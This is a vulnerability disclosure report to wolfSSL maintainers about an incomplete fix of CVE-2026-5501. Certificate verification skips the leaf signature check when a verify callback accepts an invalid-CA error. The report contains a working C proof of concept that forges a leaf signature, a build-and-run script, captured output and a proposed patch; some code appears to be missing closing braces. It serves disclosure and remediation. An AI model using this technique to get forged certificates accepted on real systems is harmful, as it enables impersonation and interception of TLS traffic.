<!-- source: https://red.anthropic.com/2026/cvd/findings/ANT-2026-K8YY7WWS -->

# ANT-2026-K8YY7WWS · wolfssl/wolfssl

## improper-cert-validation high

[CVE-2026-5501](https://nvd.nist.gov/vuln/detail/CVE-2026-5501)
[GHSA-hg75-4cmp-f367](https://github.com/advisories/GHSA-hg75-4cmp-f367)

Maintainer high

Triage and disclosure were performed by Calif. The writeup below is the document the firm sent to the maintainer.

# ANT-2026-04591 — wolfSSL 5.9.1 `X509_verify_cert` verify\_cb path still skips leaf signature

Incomplete fix of **CVE-2026-5501**. Commit `e5ab7fa74` (PR #10102, shipped in
5.9.1) added a fail-closed `goto exit` to the `!isCa` branch when no
`verify_cb` is registered, but when an application sets
`X509_STORE_CTX_set_verify_cb` with a callback that returns `1` (the standard
OpenSSL "collect all errors and continue" pattern), the
`else { X509StoreVerifyCert(ctx) }` block at `src/x509_str.c:653-672` is still
skipped. A leaf with a **forged signature** over a CA:FALSE intermediate is
accepted with `ret=1`, and the callback is only ever shown
`err=79 (X509_V_ERR_INVALID_CA)` — never `err=7 (CERT_SIGNATURE_FAILURE)`.
OpenSSL on the identical chain with the identical callback surfaces err=79,
err=32, **and** err=7, leaving `ctx->error=7`.

## Quick start

```
./run_poc.sh             # clone v5.9.1-stable, build --enable-opensslall, run PoC
./run_poc.sh --patched   # apply fix_ANT-2026-04591.patch, rebuild, re-run
./run_poc.sh --skip-build
```

Expected (unpatched):

```
  [cb] ok=0 err=79 -> returning 1 (accept)
[FORGED+cb] X509_verify_cert ret=1 ctx->error=79
[+] VULNERABLE
```

Expected (`--patched`):

```
  [cb] ok=0 err=79 -> returning 1 (accept)
  [cb] ok=0 err=7 -> returning 1 (accept)
[FORGED+cb] X509_verify_cert ret=1 ctx->error=7
[+] PASS (patched)
```

## Files

| file | purpose |
| --- | --- |
| `poc_ANT-2026-04591.c` | wolfSSL PoC: verify\_cb returns 1, forged-sig leaf over CA:FALSE intermediate |
| `poc_ANT-2026-04591_openssl.c` | OpenSSL differential (same chain, same callback → surfaces err=7) |
| `poc_ANT-2026-04591_output.txt` | captured output before + after patch |
| `fix_ANT-2026-04591.patch` | proposed fix against v5.9.1-stable |
| `run_poc.sh` | one-command repro |

## Cert chain

Uses wolfSSL's own test corpus at
`certs/intermediate/ca_false_intermediate/`: `test_ca.pem` (trusted root) →
`test_int_not_cacert.pem` (CA:FALSE, legitimately signed by root) →
`test_sign_bynoca_srv.pem` (leaf). The PoC corrupts ~90 bytes of the leaf's
signature at runtime to produce the forgery.

## Bug 2 — X509\_verify\_cert verify\_cb Path Still Skips Leaf Signature (Incomplete Fix of CVE-2026-5501)

**ANT-2026-04591** · CVSS 3.1 **7.4 HIGH** · `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`

### Summary

Commit [`e5ab7fa74`](https://github.com/wolfSSL/wolfssl/commit/e5ab7fa7457d82294bafcfb6c103a9e79b4aa213) (PR #10102) fixed the as-reported CVE-2026-5501 default path by adding a fail-closed `goto exit` to the `!isCa` branch when `verify_cb == NULL` ([x509\_str.c:647-650](https://github.com/wolfSSL/wolfssl/blob/v5.9.1-stable/src/x509_str.c#L647-L650)). But when `verify_cb` returns `1` for `X509_V_ERR_INVALID_CA` — the standard OpenSSL "collect all errors" pattern used by Qt's `QSslSocket`, curl-style certificate-error reporting, and certificate-pinning libraries — control exits the `if (!issuer->isCa)` block at [x509\_str.c:640-651](https://github.com/wolfSSL/wolfssl/blob/v5.9.1-stable/src/x509_str.c#L640-L651) and the `else { X509StoreVerifyCert(ctx); }` block at [x509\_str.c:653-672](https://github.com/wolfSSL/wolfssl/blob/v5.9.1-stable/src/x509_str.c#L653-L672) is **still skipped**. A leaf with garbage signature bytes is accepted with `ret=1, ctx->error=79`, and the callback only ever sees `err=79` — never `err=7 (CERT_SIGNATURE_FAILURE)`. OpenSSL 3.0 on the identical chain surfaces `err=79`, `err=32`, **and** `err=7`, leaving `ctx->error=7`.

### Reproduce

```
cd 02_ANT-2026-04591_x509-verifycb-leaf-sig && ./run_poc.sh
```

**wolfSSL 5.9.1:**

```
  [cb] ok=0 err=79 -> returning 1 (accept)
[FORGED+cb] X509_verify_cert ret=1 ctx->error=79
[FORGED+cb] callback saw: err79(INVALID_CA)=yes  err7(CERT_SIGNATURE_FAILURE)=NO
[FORGED+cb] *** VULNERABLE ***
```

**OpenSSL 3.0.18 (same chain, same callback):**

```
  [cb] ok=0 err=79 -> returning 1
  [cb] ok=0 err=32 -> returning 1
  [cb] ok=0 err=7 (certificate signature failure) -> returning 1
[FORGED+cb] X509_verify_cert ret=1 ctx->error=7
```

**Affected:** wolfSSL 5.9.0–5.9.1 with `--enable-opensslall` (or `WOLFSSL_QT`, `--enable-qt`, `--enable-nginx`, `--enable-haproxy`, `--enable-all`); application installs `X509_STORE_CTX_set_verify_cb` returning `1` for `INVALID_CA`. Native TLS handshake (`ProcessPeerCerts`) is unaffected.

### Patch

Drop the `else` so the override case falls through to `X509StoreVerifyCert`:

```
--- a/src/x509_str.c
+++ b/src/x509_str.c
@@ -643,12 +643,16 @@ int wolfSSL_X509_verify_cert(WOLFSSL_X509_STORE_CTX* ctx)
                         ret = WOLFSSL_FAILURE;
                         goto exit;
+                    /* verify_cb accepted X509_V_ERR_INVALID_CA: fall through
+                     * to the normal AddCa + X509StoreVerifyCert path so the
+                     * leaf's signature is still checked and any signature
+                     * failure is surfaced to the callback (OpenSSL parity). */
                 else {
                     ret = WOLFSSL_FAILURE;
                     goto exit;
-            } else
+            }
         #endif
                 ret = X509StoreAddCa(ctx->store, issuer,
```

> **Verified:** callback now sees `err=79` and `err=7`; `ctx->error=7` (OpenSSL parity). No-callback path still rejects `ret=0, ctx->error=79` (no regression of e5ab7fa74).

## Attachment: `02_ANT-2026-04591_x509-verifycb-leaf-sig/fix_ANT-2026-04591.patch`

```
diff --git a/src/x509_str.c b/src/x509_str.c
index 90113caed..a1f2e3c4d 100644
--- a/src/x509_str.c
+++ b/src/x509_str.c
@@ -643,12 +643,16 @@ int wolfSSL_X509_verify_cert(WOLFSSL_X509_STORE_CTX* ctx)
                         ret = WOLFSSL_FAILURE;
                         goto exit;
+                    /* verify_cb accepted X509_V_ERR_INVALID_CA: fall through
+                     * to the normal AddCa + X509StoreVerifyCert path so the
+                     * leaf's signature is still checked and any signature
+                     * failure is surfaced to the callback (OpenSSL parity). */
                 else {
                     ret = WOLFSSL_FAILURE;
                     goto exit;
-            } else
+            }
         #endif
                 ret = X509StoreAddCa(ctx->store, issuer,
```

## Attachment: `02_ANT-2026-04591_x509-verifycb-leaf-sig/poc_ANT-2026-04591.c`

```
/* ANT-2026-04591 — wolfSSL 5.9.1 X509_verify_cert: verify_cb path still skips
 * leaf signature verification (incomplete fix of CVE-2026-5501).
 *
 * CVE-2026-5501 was fixed in 5.9.1 commit e5ab7fa74 by adding a fail-closed
 * `goto exit` to the `!isCa` branch when `verify_cb == NULL`. But when an
 * application registers a verify_cb that returns 1 (the standard OpenSSL
 * "override this error and continue collecting" pattern — used by Qt,
 * curl-style cert error reporting, cert-pinning libs), the
 * `else { X509StoreAddCa(); X509StoreVerifyCert(ctx); }` block at
 * src/x509_str.c:653-672 is STILL skipped, so the leaf's signature is never
 * fed to wolfSSL_CertManagerVerifyBuffer.
 *
 * Result: a leaf with garbage signature bytes is accepted with ret=1, and
 * the callback is only ever shown err=79 (X509_V_ERR_INVALID_CA) — never
 * err=7 (X509_V_ERR_CERT_SIGNATURE_FAILURE). OpenSSL on the identical chain
 * with the identical callback surfaces err=79, err=32 AND err=7.
 *
 * Chain: trusted root -> CA:FALSE intermediate (legit sig) -> forged leaf.
 * Uses wolfSSL's own test corpus: certs/intermediate/ca_false_intermediate/
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <wolfssl/options.h>
#include <wolfssl/ssl.h>
#include <wolfssl/openssl/ssl.h>
#include <wolfssl/openssl/x509.h>
#include <wolfssl/openssl/x509_vfy.h>

#ifndef CERTS_DIR
#define CERTS_DIR "certs/intermediate/ca_false_intermediate"
#endif

static int seen_err7  = 0;   /* X509_V_ERR_CERT_SIGNATURE_FAILURE */
static int seen_err79 = 0;   /* X509_V_ERR_INVALID_CA */
static int last_err   = 0;

/* The standard "collect all errors, return 1" callback pattern. */
static int cb_accept_all(int ok, WOLFSSL_X509_STORE_CTX *ctx) {
    int e = wolfSSL_X509_STORE_CTX_get_error(ctx);
    if (!ok) {
        last_err = e;
        if (e == 7)  seen_err7  = 1;
        if (e == 79) seen_err79 = 1;
        printf("  [cb] ok=%d err=%d -> returning 1 (accept)\n", ok, e);
    return 1;

static WOLFSSL_X509 *load_pem(const char *p) {
    WOLFSSL_X509 *x = wolfSSL_X509_load_certificate_file(p, SSL_FILETYPE_PEM);
    if (!x) fprintf(stderr, "  ! failed to load %s\n", p);
    return x;

int main(void) {
    wolfSSL_Init();
    printf("=== ANT-2026-04591: wolfSSL X509_verify_cert verify_cb path "
           "(incomplete fix of CVE-2026-5501) ===\n");
    printf("wolfSSL version: %s\n\n", wolfSSL_lib_version());

    WOLFSSL_X509 *root   = load_pem(CERTS_DIR "/test_ca.pem");
    WOLFSSL_X509 *interm = load_pem(CERTS_DIR "/test_int_not_cacert.pem");
    WOLFSSL_X509 *leaf   = load_pem(CERTS_DIR "/test_sign_bynoca_srv.pem");
    if (!root || !interm || !leaf) return 2;

    /* Forge: corrupt the leaf's signature bytes (XOR ~90 bytes near the end). */
    int derSz = 0;
    const unsigned char *der = wolfSSL_X509_get_der(leaf, &derSz);
    unsigned char *fd = malloc((size_t)derSz);
    memcpy(fd, der, (size_t)derSz);
    for (int i = derSz - 100; i < derSz - 10; i++) fd[i] ^= 0xFF;
    const unsigned char *p = fd;
    WOLFSSL_X509 *forged = wolfSSL_d2i_X509(NULL, &p, derSz);
    if (!forged) { fprintf(stderr, "d2i forged fail\n"); return 2; }

    /* Build store: trust root, set verify_cb, supply CA:FALSE interm as
     * untrusted, verify the forged-signature leaf. */
    WOLFSSL_X509_STORE     *store = wolfSSL_X509_STORE_new();
    WOLFSSL_X509_STORE_CTX *ctx   = wolfSSL_X509_STORE_CTX_new();
    WOLF_STACK_OF(WOLFSSL_X509) *un = wolfSSL_sk_X509_new_null();

    wolfSSL_X509_STORE_add_cert(store, root);
    wolfSSL_X509_STORE_set_verify_cb(store, cb_accept_all);
    wolfSSL_sk_X509_push(un, interm);
    wolfSSL_X509_STORE_CTX_init(ctx, store, forged, un);

    int ret = wolfSSL_X509_verify_cert(ctx);
    int err = wolfSSL_X509_STORE_CTX_get_error(ctx);

    printf("\n[FORGED+cb] X509_verify_cert ret=%d ctx->error=%d\n", ret, err);
    printf("[FORGED+cb] callback saw: err79(INVALID_CA)=%s  "
           "err7(CERT_SIGNATURE_FAILURE)=%s\n",
           seen_err79 ? "yes" : "no", seen_err7 ? "yes" : "NO");

    int rc;
    if (ret == WOLFSSL_SUCCESS && !seen_err7) {
        printf("\n[FORGED+cb] *** VULNERABLE ***\n");
        printf("[FORGED+cb] ret=SUCCESS for a forged-signature leaf; callback "
               "was never shown err=7.\n");
        printf("[FORGED+cb] (verify_cb=1 path at src/x509_str.c:640-651 still "
               "skips X509StoreVerifyCert)\n");
        rc = 0;
    } else if (seen_err7) {
        printf("\n[FORGED+cb] FIXED: callback was shown err=7 "
               "(CERT_SIGNATURE_FAILURE) — leaf signature was checked.\n");
        rc = 1;
    } else {
        printf("\n[FORGED+cb] rejected (ret=%d) without surfacing err=7\n", ret);
        rc = 1;

    wolfSSL_X509_STORE_CTX_free(ctx);
    wolfSSL_X509_STORE_free(store);
    wolfSSL_sk_X509_free(un);
    wolfSSL_X509_free(forged);
    wolfSSL_X509_free(root);
    wolfSSL_X509_free(interm);
    wolfSSL_X509_free(leaf);
    free(fd);
    wolfSSL_Cleanup();
    return rc;
```

## Attachment: `02_ANT-2026-04591_x509-verifycb-leaf-sig/poc_ANT-2026-04591_openssl.c`

```
/* ANT-2026-04591 — OpenSSL differential for the verify_cb-returns-1 path.
 *
 * Same chain (trusted root -> CA:FALSE intermediate -> forged-sig leaf),
 * same callback (returns 1 for every error). OpenSSL surfaces:
 *   err=79 (invalid CA certificate)
 *   err=32 (key usage does not include certificate signing)
 *   err=7  (certificate signature failure)
 * and leaves ctx->error = 7. wolfSSL 5.9.1 surfaces only err=79.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/x509.h>
#include <openssl/x509_vfy.h>
#include <openssl/pem.h>

#ifndef CERTS_DIR
#define CERTS_DIR "certs/intermediate/ca_false_intermediate"
#endif

static int cb_accept_all(int ok, X509_STORE_CTX *ctx) {
    int e = X509_STORE_CTX_get_error(ctx);
    if (!ok) printf("  [cb] ok=%d err=%d (%s) -> returning 1\n", ok, e,
                    X509_verify_cert_error_string(e));
    return 1;

static X509 *load_pem(const char *p) {
    FILE *f = fopen(p, "r");
    if (!f) return NULL;
    X509 *x = PEM_read_X509(f, NULL, NULL, NULL);
    fclose(f);
    return x;

int main(void) {
    printf("=== ANT-2026-04591: OpenSSL differential, %s ===\n\n",
           OPENSSL_VERSION_TEXT);
    X509 *root   = load_pem(CERTS_DIR "/test_ca.pem");
    X509 *interm = load_pem(CERTS_DIR "/test_int_not_cacert.pem");
    X509 *leaf   = load_pem(CERTS_DIR "/test_sign_bynoca_srv.pem");
    if (!root || !interm || !leaf) { printf("load fail\n"); return 2; }

    int derSz = i2d_X509(leaf, NULL);
    unsigned char *fd = malloc((size_t)derSz), *pp = fd;
    i2d_X509(leaf, &pp);
    for (int i = derSz - 100; i < derSz - 10; i++) fd[i] ^= 0xFF;
    const unsigned char *p = fd;
    X509 *forged = d2i_X509(NULL, &p, derSz);
    if (!forged) { printf("d2i forged fail\n"); return 2; }

    X509_STORE     *store = X509_STORE_new();
    X509_STORE_CTX *ctx   = X509_STORE_CTX_new();
    STACK_OF(X509) *un    = sk_X509_new_null();
    X509_STORE_add_cert(store, root);
    X509_STORE_set_verify_cb(store, cb_accept_all);
    sk_X509_push(un, interm);
    X509_STORE_CTX_init(ctx, store, forged, un);

    int ret = X509_verify_cert(ctx);
    int err = X509_STORE_CTX_get_error(ctx);
    printf("\n[FORGED+cb] X509_verify_cert ret=%d ctx->error=%d (%s)\n",
           ret, err, X509_verify_cert_error_string(err));
    return 0;
```

## Attachment: `02_ANT-2026-04591_x509-verifycb-leaf-sig/poc_ANT-2026-04591_output.txt`

```
=== BEFORE PATCH (wolfSSL v5.9.1-stable @ 1d363f3a, --enable-opensslall) ===

=== ANT-2026-04591: wolfSSL X509_verify_cert verify_cb path (incomplete fix of CVE-2026-5501) ===
wolfSSL version: 5.9.1

  [cb] ok=0 err=79 -> returning 1 (accept)

[FORGED+cb] X509_verify_cert ret=1 ctx->error=79
[FORGED+cb] callback saw: err79(INVALID_CA)=yes  err7(CERT_SIGNATURE_FAILURE)=NO

[FORGED+cb] *** VULNERABLE ***
[FORGED+cb] ret=SUCCESS for a forged-signature leaf; callback was never shown err=7.
[FORGED+cb] (verify_cb=1 path at src/x509_str.c:640-651 still skips X509StoreVerifyCert)

--- OpenSSL differential (same chain, same callback) ---

=== ANT-2026-04591: OpenSSL differential, OpenSSL 3.0.18 30 Sep 2025 ===

  [cb] ok=0 err=79 (invalid CA certificate) -> returning 1
  [cb] ok=0 err=32 (key usage does not include certificate signing) -> returning 1
  [cb] ok=0 err=7 (certificate signature failure) -> returning 1

[FORGED+cb] X509_verify_cert ret=1 ctx->error=7 (certificate signature failure)

=== AFTER PATCH (fix_ANT-2026-04591.patch applied) ===

=== ANT-2026-04591: wolfSSL X509_verify_cert verify_cb path (incomplete fix of CVE-2026-5501) ===
wolfSSL version: 5.9.1

  [cb] ok=0 err=79 -> returning 1 (accept)
  [cb] ok=0 err=7 -> returning 1 (accept)

[FORGED+cb] X509_verify_cert ret=1 ctx->error=7
[FORGED+cb] callback saw: err79(INVALID_CA)=yes  err7(CERT_SIGNATURE_FAILURE)=yes

[FORGED+cb] FIXED: callback was shown err=7 (CERT_SIGNATURE_FAILURE) — leaf signature was checked.
```

## Attachment: `02_ANT-2026-04591_x509-verifycb-leaf-sig/run_poc.sh`

```
#!/usr/bin/env bash
# ANT-2026-04591 — wolfSSL 5.9.1 X509_verify_cert: verify_cb path still skips
# leaf signature verification (incomplete fix of CVE-2026-5501)
#
# Usage:
#   ./run_poc.sh              # clone v5.9.1-stable, build --enable-opensslall, run PoC
#   ./run_poc.sh --patched    # apply fix_ANT-2026-04591.patch, rebuild, re-run
#   ./run_poc.sh --skip-build # reuse existing build
set -euo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$HERE"

WOLFSSL_TAG=v5.9.1-stable
WOLFSSL_SHA=1d363f3adceba9d1478230ede476a37b0dcdef24
SRC="$HERE/wolfssl-5.9.1"
PATCH="$HERE/fix_ANT-2026-04591.patch"
POC_SRC="$HERE/poc_ANT-2026-04591.c"
POC_BIN="$HERE/poc_ANT-2026-04591"
PATCH_MARKER='verify_cb accepted X509_V_ERR_INVALID_CA'

PATCHED=0
SKIP_BUILD=0
for a in "$@"; do
  case "$a" in
    --patched)    PATCHED=1 ;;
    --skip-build) SKIP_BUILD=1 ;;
    *) echo "unknown arg: $a"; exit 2 ;;
  esac
done

cleanup() {
  if [[ -d "$SRC" ]] && grep -q "$PATCH_MARKER" "$SRC/src/x509_str.c" 2>/dev/null; then
    ( cd "$SRC" && patch -R -p1 -s < "$PATCH" ) || true
    rm -f "$SRC/src/.libs/libwolfssl_la-ssl.lo" "$SRC/src/.libs/libwolfssl.a" 2>/dev/null
  fi
trap cleanup EXIT

# ── 0. download ────────────────────────────────────────────────────────────────
if [[ ! -d "$SRC" ]]; then
  echo "[*] cloning wolfSSL $WOLFSSL_TAG (~2 min)..."
  git clone --filter=blob:none --no-checkout https://github.com/wolfSSL/wolfssl.git "$SRC"
  ( cd "$SRC" && git checkout "$WOLFSSL_SHA" )
fi

# ── 1. build ───────────────────────────────────────────────────────────────────
if [[ "$SKIP_BUILD" -eq 0 && ! -f "$SRC/src/.libs/libwolfssl.a" ]]; then
  echo "[*] building wolfSSL --enable-opensslall (~5 min first run)..."
  ( cd "$SRC"
    ./autogen.sh
    ./configure --enable-opensslall --enable-static --disable-shared \
        --disable-jobserver
    make -j"$(nproc)"
  ) > build.log 2>&1 || { tail -50 build.log; exit 1; }
elif [[ "$SKIP_BUILD" -eq 1 && ! -f "$SRC/src/.libs/libwolfssl.a" ]]; then
  echo "[-] --skip-build but no build present; run without --skip-build first"
  exit 1
fi

# Cert chain: wolfSSL ships the CA:FALSE-intermediate test corpus we need.
#   certs/intermediate/ca_false_intermediate/test_ca.pem               (trusted root)
#   certs/intermediate/ca_false_intermediate/test_int_not_cacert.pem   (CA:FALSE, signed by root)
#   certs/intermediate/ca_false_intermediate/test_sign_bynoca_srv.pem  (leaf)
# The PoC corrupts the leaf's signature bytes at runtime to produce the forgery.
for f in test_ca.pem test_int_not_cacert.pem test_sign_bynoca_srv.pem; do
  if [[ ! -f "$SRC/certs/intermediate/ca_false_intermediate/$f" ]]; then
    echo "[-] missing test cert: $f"; exit 1
  fi
done

# ── patch / unpatch ────────────────────────────────────────────────────────────
if [[ "$PATCHED" -eq 1 ]]; then
  if ! grep -q "$PATCH_MARKER" "$SRC/src/x509_str.c"; then
    echo "[*] applying $PATCH"
    ( cd "$SRC" && patch -p1 -s < "$PATCH" )
    rm -f "$SRC/src/.libs/libwolfssl_la-ssl.lo" "$SRC/src/.libs/libwolfssl.a"
  fi
else
  if grep -q "$PATCH_MARKER" "$SRC/src/x509_str.c"; then
    echo "[*] reverting patch"
    ( cd "$SRC" && patch -R -p1 -s < "$PATCH" )
    rm -f "$SRC/src/.libs/libwolfssl_la-ssl.lo" "$SRC/src/.libs/libwolfssl.a"
  fi
fi
if [[ ! -f "$SRC/src/.libs/libwolfssl.a" ]]; then
  echo "[*] rebuilding src/x509_str.c ..."
  ( cd "$SRC" && make -j"$(nproc)" src/libwolfssl.la ) > rebuild.log 2>&1 \
    || { tail -30 rebuild.log; exit 1; }
fi

# ── 2. compile PoC ────────────────────────────────────────────────────────────
echo "[*] compiling PoC against $( [[ $PATCHED -eq 1 ]] && echo patched || echo unpatched ) libwolfssl.a"
gcc -I"$SRC" -o "$POC_BIN" "$POC_SRC" "$SRC/src/.libs/libwolfssl.a" -lm -lpthread

# ── 3. run ────────────────────────────────────────────────────────────────────
echo "[*] running PoC (forged-signature leaf over CA:FALSE intermediate, verify_cb returns 1)"
echo
OUT=$( cd "$SRC" && "$POC_BIN" 2>&1 ) || true
echo "$OUT"
echo

# Optional OpenSSL differential
if [[ -f "$HERE/poc_ANT-2026-04591_openssl.c" ]] && command -v openssl >/dev/null; then
  gcc -o "$HERE/poc_ANT-2026-04591_openssl" "$HERE/poc_ANT-2026-04591_openssl.c" \
      -lssl -lcrypto 2>/dev/null && {
    echo "--- OpenSSL differential (same chain, same callback) ---"
    ( cd "$SRC" && "$HERE/poc_ANT-2026-04591_openssl" 2>&1 ) || true
    echo
fi

# ── 4. verdict ────────────────────────────────────────────────────────────────
echo "──────────────────────────────────────────────────────────────────────────"
SAW7=0;  echo "$OUT" | grep -qE '\[cb\].*err=7\b' && SAW7=1
RET1=0;  echo "$OUT" | grep -q  'X509_verify_cert ret=1' && RET1=1

if [[ "$PATCHED" -eq 1 ]]; then
  if [[ "$SAW7" -eq 1 ]] && echo "$OUT" | grep -q 'ctx->error=7'; then
    echo "[+] PASS (patched): callback saw err=7 (CERT_SIGNATURE_FAILURE), ctx->error=7"
    echo "    — matches OpenSSL semantics; leaf signature is now verified."
    exit 0
  else
    echo "[-] FAIL: patch applied but err=7 not surfaced to callback"
    exit 1
  fi
else
  if [[ "$RET1" -eq 1 && "$SAW7" -eq 0 ]]; then
    echo "[+] VULNERABLE: X509_verify_cert ret=1 for forged-signature leaf;"
    echo "    callback only saw err=79 (INVALID_CA) — err=7 (CERT_SIGNATURE_FAILURE)"
    echo "    was NEVER surfaced. verify_cb=1 path skips X509StoreVerifyCert"
    echo "    at src/x509_str.c:651-672 (incomplete fix of CVE-2026-5501)."
    exit 0
  else
    echo "[-] FAIL: expected ret=1 with no err=7; got SAW7=$SAW7 RET1=$RET1"
    exit 1
  fi
fi
```

1. 2026-03-29
2. 2026-04-05
3. 2026-05-07
4. 2026-05-07
5. 2026-05-20

f0a0272127e818f17635b5af4aa4e3630e50273d8048fe1d0cbc118003c476935904b2e3f12bc2cabbde80cf02dcf7c6a7607dbb3add0f15d2d452ba3169beb2

Committed 2026-04-05 23:37 UTC

Revealed 2026-05-20 07:40 UTC

[Verify (download preimage.json)](data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-K8YY7WWS%22%2C%22bug_class%22%3A%22improper-cert-validation%22%2C%22claude_severity%22%3A%22high%22%2C%22commit_sha%22%3Anull%2C%22created_at%22%3A%222026-03-29T20%3A42%3A36%2B00%3A00%22%2C%22description%22%3Anull%2C%22discovered_at%22%3Anull%2C%22location%22%3Anull%2C%22poc_sha256%22%3Anull%2C%22preimage_version%22%3A1%2C%22project%22%3A%22wolfSSL%22%2C%22reproduction%22%3Anull%2C%22technical_details%22%3Anull%2C%22title%22%3A%22wolfssl%20x509%20verify%20cert%20leaf%20signature%20verification%20by%22%2C%22vendor_severity%22%3A%22high%22%7D)

```
  "ant_id": "ANT-2026-K8YY7WWS",
  "bug_class": "improper-cert-validation",
  "created_at": "2026-03-29T20:42:36+00:00",
  "description": null,
  "location": null,
  "project": "wolfSSL",
  "technical_details": null,
  "title": "wolfssl x509 verify cert leaf signature verification by",
```
